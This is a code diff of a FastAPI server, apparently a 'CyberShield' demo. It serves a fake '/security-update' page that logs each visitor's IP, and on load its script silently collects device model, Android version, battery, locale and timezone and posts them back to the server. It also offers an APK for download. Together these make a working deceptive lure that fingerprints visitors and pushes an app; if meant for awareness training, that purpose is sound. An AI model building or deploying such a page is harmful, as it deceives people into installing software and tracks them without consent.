@@ -6,13 +6,17 @@ from pathlib import Path
 import uuid
 import html
 
+
 app = FastAPI(title="CyberShield Security")
+
 
 BASE_DIR = Path(__file__).resolve().parent
 APK_PATH = BASE_DIR / "demo_files" / "CyberShieldAPK.apk"
 
 
+# ============================================================
 # DATA MODEL
+# ============================================================
 
 class DemoEvent(BaseModel):
 
@@ -29,10 +33,18 @@ class DemoEvent(BaseModel):
     locale: str = "Unknown"
     timezone: str = "Unknown"
 
+
+# ============================================================
+# TEMPORARY STORAGE
+# ============================================================
+
 events = []
 
 
-# HELPER - GET CLIENT I
+# ============================================================
+# GET CLIENT IP
+# ============================================================
+
 def get_client_ip(request: Request):
 
     forwarded_for = request.headers.get("x-forwarded-for")
@@ -48,113 +60,9 @@ def get_client_ip(request: Request):
     return "UNKNOWN"
 
 
-# HELPER - GET ANDROID VERSION
-
-def extract_android_version(user_agent: str):
-
-    try:
-
-        if "Android" in user_agent:
-
-            part = user_agent.split("Android", 1)[1]
-
-            part = part.strip()
-
-            if ";" in part:
-
-                version = part.split(";", 1)[0].strip()
-
-            elif ")" in part:
-
-                version = part.split(")", 1)[0].strip()
-
-            else:
-
-                version = part.split(" ", 1)[0].strip()
-
-            return version
-
-    except Exception:
-
-        pass
-
-    return "Unknown"
-
-
-# HELPER - GET DEVICE INFORMATION
-
-def extract_device_info(user_agent: str):
-
-    manufacturer = "Unknown"
-    device = "Unknown"
-
-    try:
-       
-        if "Android" in user_agent:
-
-            android_part = user_agent.split("Android", 1)[1]
-
-            if ";" in android_part:
-
-                device_part = android_part.split(";", 1)[1]
-
-                if ")" in device_part:
-
-                    device_part = device_part.split(")", 1)[0]
-
-                device_part = device_part.strip()
-
-                if device_part:
-
-                    device = device_part
-
-                    # Basic manufacturer detection
-                    device_upper = device.upper()
-
-                    if "SAMSUNG" in device_upper or device_upper.startswith("SM-"):
-
-                        manufacturer = "Samsung"
-
-                    elif "PIXEL" in device_upper:
-
-                        manufacturer = "Google"
-
-                    elif "ONEPLUS" in device_upper:
-
-                        manufacturer = "OnePlus"
-
-                    elif "XIAOMI" in device_upper or device_upper.startswith("MI"):
-
-                        manufacturer = "Xiaomi"
-
-                    elif "REDMI" in device_upper:
-
-                        manufacturer = "Xiaomi"
-
-                    elif "VIVO" in device_upper:
-
-                        manufacturer = "Vivo"
-
-                    elif "OPPO" in device_upper:
-
-                        manufacturer = "Oppo"
-
-                    elif "REALME" in device_upper:
-
-                        manufacturer = "Realme"
-
-                    elif "MOTOROLA" in device_upper or device_upper.startswith("MOTO"):
-
-                        manufacturer = "Motorola"
-
-    except Exception:
-
-        pass
-
-    return manufacturer, device
-
-
+# ============================================================
 # ROOT
+# ============================================================
 
 @app.get("/")
 def root():
@@ -164,19 +72,22 @@ def root():
     }
 
 
+# ============================================================
 # GET ALL EVENTS
+# ============================================================
+
 @app.get("/api/demo/events")
 def get_events():
 
     return {
-
         "total": len(events),
-
         "events": events
-
     }
 
+
+# ============================================================
 # CLEAR EVENTS
+# ============================================================
 
 @app.delete("/api/demo/events")
 def clear_events():
@@ -184,15 +95,121 @@ def clear_events():
     events.clear()
 
     return {
-
         "success": True,
-
         "message": "Demo events cleared"
-
     }
 
 
-# RECEIVE ANDROID / BROWSER EVENT
+# ============================================================
+# RECEIVE AND UPDATE DEVICE INFORMATION
+# ============================================================
+
+@app.post("/api/demo/event/{event_id}")
+async def update_demo_event(
+    event_id: str,
+    data: DemoEvent,
+    request: Request
+):
+
+    client_ip = get_client_ip(request)
+
+    # Find existing event
+    for event in events:
+
+        if event["id"] == event_id:
+
+            event["event"] = data.event
+
+            event["device_manufacturer"] = (
+                data.device_manufacturer
+            )
+
+            event["device"] = data.device
+
+            event["android_version"] = (
+                data.android_version
+            )
+
+            event["android_sdk"] = (
+                data.android_sdk
+            )
+
+            event["battery_percent"] = (
+                data.battery_percent
+            )
+
+            event["locale"] = data.locale
+
+            event["timezone"] = data.timezone
+
+            # Keep original IP if available,
+            # otherwise use current request IP
+            if event["ip"] == "UNKNOWN":
+                event["ip"] = client_ip
+
+            print("\n========== SECURITY EVENT UPDATED ==========")
+
+            print("Event:", event["event"])
+
+            print(
+                "Device:",
+                f"{event['device_manufacturer']} "
+                f"{event['device']}"
+            )
+
+            print(
+                "Android:",
+                event["android_version"]
+            )
+
+            print(
+                "Battery:",
+                f"{event['battery_percent']}%"
+            )
+
+            print(
+                "Locale:",
+                event["locale"]
+            )
+
+            print(
+                "Timezone:",
+                event["timezone"]
+            )
+
+            print(
+                "IP:",
+                event["ip"]
+            )
+
+            print(
+                "Time:",
+                event["time"]
+            )
+
+            print(
+                "Event ID:",
+                event["id"]
+            )
+
+            print("============================================\n")
+
+            return {
+                "success": True,
+                "message": "Event updated",
+                "event_id": event_id
+            }
+
+
+    return {
+        "success": False,
+        "message": "Event not found"
+    }
+
+
+# ============================================================
+# ORIGINAL ANDROID EVENT ENDPOINT
+# ============================================================
 
 @app.post("/api/demo/event")
 async def receive_demo_event(
@@ -204,11 +221,9 @@ async def receive_demo_event(
 
     event = {
 
-        "id":
-            str(uuid.uuid4())[:8],
+        "id": str(uuid.uuid4())[:8],
 
-        "event":
-            data.event,
+        "event": data.event,
 
         "device_manufacturer":
             data.device_manufacturer,
@@ -238,20 +253,14 @@ async def receive_demo_event(
             datetime.now().strftime(
                 "%Y-%m-%d %H:%M:%S"
             )
-
     }
 
     events.append(event)
 
 
-    # SERVER CONSOLE
-
     print("\n========== SECURITY EVENT ==========")
 
-    print(
-        "Event:",
-        data.event
-    )
+    print("Event:", data.event)
 
     print(
         "Device:",
@@ -298,9 +307,7 @@ async def receive_demo_event(
         event["id"]
     )
 
-    print(
-        "====================================\n"
-    )
+    print("====================================\n")
 
 
     return {
@@ -319,7 +326,9 @@ async def receive_demo_event(
     }
 
 
+# ============================================================
 # DOWNLOAD APK
+# ============================================================
 
 @app.get("/download-apk")
 def download_apk():
@@ -333,7 +342,6 @@ def download_apk():
 
             "expected_path":
                 str(APK_PATH)
-
         }
 
     return FileResponse(
@@ -345,62 +353,43 @@ def download_apk():
 
         filename=
             "CyberShieldAPK.apk"
-
     )
 
+
+# ============================================================
 # SECURITY UPDATE PAGE
+# ============================================================
+
 @app.get(
     "/security-update",
     response_class=HTMLResponse
 )
 def security_update_page(request: Request):
 
+    # ========================================================
+    # CREATE ONE EVENT
+    # ========================================================
+
     client_ip = get_client_ip(request)
 
-    user_agent = request.headers.get(
-        "user-agent",
-        "Unknown"
-    )
-
-    accept_language = request.headers.get(
-        "accept-language",
-        "Unknown"
-    )
-
-
-    # --------------------------------------------------------
-    # TRY TO DETECT DEVICE FROM USER-AGENT
-    # --------------------------------------------------------
-
-    android_version = extract_android_version(
-        user_agent
-    )
-
-    manufacturer, device = extract_device_info(
-        user_agent
-    )
-
-
-    # --------------------------------------------------------
-    # CREATE INITIAL LINK OPENED EVENT
-    # --------------------------------------------------------
+    event_id = str(uuid.uuid4())[:8]
 
     event = {
 
         "id":
-            str(uuid.uuid4())[:8],
+            event_id,
 
         "event":
             "LINK OPENED",
 
         "device_manufacturer":
-            manufacturer,
+            "Detecting...",
 
         "device":
-            device,
+            "Detecting...",
 
         "android_version":
-            android_version,
+            "Detecting...",
 
         "android_sdk":
             0,
@@ -409,10 +398,10 @@ def security_update_page(request: Request):
             -1,
 
         "locale":
-            accept_language,
+            "Detecting...",
 
         "timezone":
-            "Unknown",
+            "Detecting...",
 
         "ip":
             client_ip,
@@ -421,69 +410,30 @@ def security_update_page(request: Request):
             datetime.now().strftime(
                 "%Y-%m-%d %H:%M:%S"
             )
-
     }
 
 
-    # --------------------------------------------------------
-    # STORE INITIAL EVENT
-    # --------------------------------------------------------
-
+    # Store the event ONCE
     events.append(event)
 
 
-    # --------------------------------------------------------
-    # SERVER CONSOLE
-    # --------------------------------------------------------
+    # Console
+    print("\n========== LINK OPENED ==========")
 
-    print("\n========== SECURITY EVENT ==========")
+    print("Event:", "LINK OPENED")
 
-    print("Event: LINK OPENED")
+    print("IP:", client_ip)
 
-    print(
-        "Device:",
-        f"{manufacturer} {device}"
-    )
+    print("Time:", event["time"])
 
-    print(
-        "Android:",
-        android_version
-    )
+    print("Event ID:", event_id)
 
-    print(
-        "Battery: Browser data pending"
-    )
-
-    print(
-        "Locale:",
-        accept_language
-    )
-
-    print(
-        "Timezone: Browser data pending"
-    )
-
-    print(
-        "IP:",
-        client_ip
-    )
-
-    print(
-        "Time:",
-        event["time"]
-    )
-
-    print(
-        "Event ID:",
-        event["id"]
-    )
-
-    print("====================================\n")
+    print("=================================\n")
 
 
-    # --------------------------------------------------------
-    # SECURITY UPDATE HTML
-    # --------------------------------------------------------
+    # ========================================================
+    # SECURITY UPDATE PAGE
+    # ========================================================
 
     return f"""
 
@@ -635,7 +585,7 @@ def security_update_page(request: Request):
         <script>
 
         // ====================================================
-        // COLLECT BROWSER / DEVICE INFORMATION
+        // COLLECT DEVICE INFORMATION
         // ====================================================
 
         async function collectDeviceInformation() {{
@@ -658,22 +608,23 @@ def security_update_page(request: Request):
                 let timezone = "Unknown";
 
 
-                // ------------------------------------------------
+                // =================================================
                 // USER AGENT
-                // ------------------------------------------------
+                // =================================================
 
                 const userAgent =
                     navigator.userAgent || "";
 
 
-                // ------------------------------------------------
+                // =================================================
                 // ANDROID VERSION
-                // ------------------------------------------------
+                // =================================================
 
                 const androidMatch =
                     userAgent.match(
                         /Android\\s([0-9.]+)/i
                     );
+
 
                 if (androidMatch) {{
 
@@ -683,9 +634,9 @@ def security_update_page(request: Request):
                 }}
 
 
-                // ------------------------------------------------
+                // =================================================
                 // DEVICE MODEL
-                // ------------------------------------------------
+                // =================================================
 
                 if (androidMatch) {{
 
@@ -693,6 +644,7 @@ def security_update_page(request: Request):
                         userAgent.match(
                             /Android\\s[0-9.]+;\\s*([^;)]+)/i
                         );
+
 
                     if (deviceMatch) {{
 
@@ -704,9 +656,9 @@ def security_update_page(request: Request):
                 }}
 
 
-                // ------------------------------------------------
+                // =================================================
                 // MANUFACTURER
-                // ------------------------------------------------
+                // =================================================
 
                 const deviceUpper =
                     device.toUpperCase();
@@ -797,13 +749,9 @@ def security_update_page(request: Request):
                 }}
 
 
-                // ------------------------------------------------
-                // ANDROID SDK
-                // ------------------------------------------------
-                // Modern browsers usually don't expose the exact
-                // Android SDK version directly.
-                //
-                // Therefore we leave it as 0 unless available.
+                // =================================================
+                // MODERN USER AGENT DATA
+                // =================================================
 
                 if (
                     navigator.userAgentData &&
@@ -845,7 +793,7 @@ def security_update_page(request: Request):
                     }} catch (error) {{
 
                         console.log(
-                            "User-Agent data unavailable"
+                            "Advanced device information unavailable"
                         );
 
                     }}
@@ -853,16 +801,17 @@ def security_update_page(request: Request):
                 }}
 
 
-                // ------------------------------------------------
+                // =================================================
                 // TIMEZONE
-                // ------------------------------------------------
+                // =================================================
 
                 try {{
 
                     timezone =
                         Intl.DateTimeFormat()
                             .resolvedOptions()
-                            .timeZone || "Unknown";
+                            .timeZone ||
+                        "Unknown";
 
                 }} catch (error) {{
 
@@ -871,13 +820,11 @@ def security_update_page(request: Request):
                 }}
 
 
-                // ------------------------------------------------
+                // =================================================
                 // BATTERY
-                // ------------------------------------------------
+                // =================================================
 
-                if (
-                    navigator.getBattery
-                ) {{
+                if (navigator.getBattery) {{
 
                     try {{
 
@@ -898,13 +845,13 @@ def security_update_page(request: Request):
                 }}
 
 
-                // ------------------------------------------------
-                // SEND INFORMATION TO BACKEND
-                // ------------------------------------------------
+                // =================================================
+                // SEND DATA TO SAME EVENT
+                // =================================================
 
                 const response =
                     await fetch(
-                        "/api/demo/event",
+                        "/api/demo/event/{event_id}",
                         {{
 
                             method: "POST",
@@ -951,7 +898,7 @@ def security_update_page(request: Request):
                 if (response.ok) {{
 
                     console.log(
-                        "CyberShield: Device information sent"
+                        "CyberShield: Event updated successfully"
                     );
 
                 }}
@@ -959,7 +906,7 @@ def security_update_page(request: Request):
             }} catch (error) {{
 
                 console.log(
-                    "CyberShield device information error:",
+                    "CyberShield:",
                     error
                 );
 
@@ -968,7 +915,10 @@ def security_update_page(request: Request):
         }}
 
 
-        // Run automatically when page opens
+        // ====================================================
+        // START COLLECTION
+        // ====================================================
+
         collectDeviceInformation();
 
         </script>
